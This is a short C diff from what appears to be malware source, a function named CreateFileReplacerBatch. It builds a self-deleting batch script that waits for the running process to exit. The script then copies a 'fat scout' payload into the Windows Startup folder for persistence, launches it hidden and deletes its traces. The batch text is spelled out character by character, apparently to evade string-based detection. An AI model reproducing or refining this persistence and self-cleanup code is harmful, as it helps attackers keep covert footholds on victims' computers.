@@ -1035,14 +1035,16 @@ VOID CreateFileReplacerBatch(__in PWCHAR lpGarbageFile, __in PWCHAR lpScoutStart
 		@echo off
 		:t
 		timeout 1
-		tasklist /FI "IMAGENAME eq %S" | findstr "No tasks"   # 1) current process name
-		if ERRORLEVEL 1 goto :t
+		for /f %%i in ('tasklist /FI "IMAGENAME eq %S"  ^| find /v /c ""' ) do set YO=%%i   # 1) current process name
+		if %YO%==4 goto :t
 		type "%S" > "%S"									  # 2) fat scout file , 3) scout path in startup
 		start /B cmd /c "%S"								  # 4) scout path in startup
 		del /F "%S"											  # 5) temp scout file 
 		del /F "%S"											  # 6) batch file 
 	*/
-	CHAR pBatchFormat[] = { '@','e','c','h','o',' ','o','f','f', '\r', '\n',   ':','t', '\r', '\n', 't', 'i', 'm', 'e', 'o', 'u', 't', ' ', '1', '\r', '\n','t','a','s','k','l','i','s','t',' ','/','F','I',' ','"','I','M','A','G','E','N','A','M','E',' ','e','q',' ','%','S','"',' ','|',' ','f','i','n','d','s','t','r',' ','"','N','o',' ','t','a','s','k','s','"', '\r', '\n', 'i','f',' ','E','R','R','O','R','L','E','V','E','L',' ','1',' ','g','o','t','o',' ',':','t', '\r', '\n', 't','y','p','e',' ','"','%','S','"',' ','>', ' ','"','%','S','"', '\r', '\n', 's','t','a','r','t',' ','/','B',' ','c','m','d',' ','/','c',' ','"','%','S','"', '\r', '\n',  'd','e','l',' ','/','F',' ','"','%','S','"', '\r', '\n', 	'd','e','l',' ','/','F',' ','"','%','S','"', 0x0 };
+	
+	CHAR pBatchFormat[] = { '@','e','c','h','o',' ','o','f','f', '\r', '\n', ':','t', '\r', '\n', 't', 'i', 'm', 'e', 'o', 'u', 't', ' ', '1', '\r', '\n', 'f', 'o', 'r', ' ', '/', 'f', ' ', '%', '%', '%', '%','i', ' ', 'i', 'n',' ','(', '\'', 't','a','s','k','l','i','s','t',' ','/','F','I',' ','"','I','M','A','G','E','N','A','M','E',' ','e','q',' ','%','S','"',' ', '^','|',' ','f','i','n','d', ' ', '/', 'v', ' ', '/', 'c', ' ', '"', '"', '\'',' ',')', ' ', 'd', 'o', ' ', 's', 'e', 't', ' ', 'Y', 'O', '=', '%', '%', '%', '%', 'i', '\r', '\n', 'i','f',' ', '%', '%', 'Y', 'O', '%', '%', '=', '=', '4', ' ','g','o','t','o',' ',':','t', '\r', '\n', 't','y','p','e',' ','"','%','S','"',' ','>', ' ','"','%','S','"', '\r', '\n', 's','t','a','r','t',' ','/','B',' ','c','m','d',' ','/','c',' ','"','%','S','"', '\r', '\n',  'd','e','l',' ','/','F',' ','"','%','S','"', '\r', '\n', 	'd','e','l',' ','/','F',' ','"','%','S','"', 0x0 };
+
 
 	PCHAR pBatchBuffer = (PCHAR) malloc(strlen(pBatchFormat) + (32767 * 3));
 
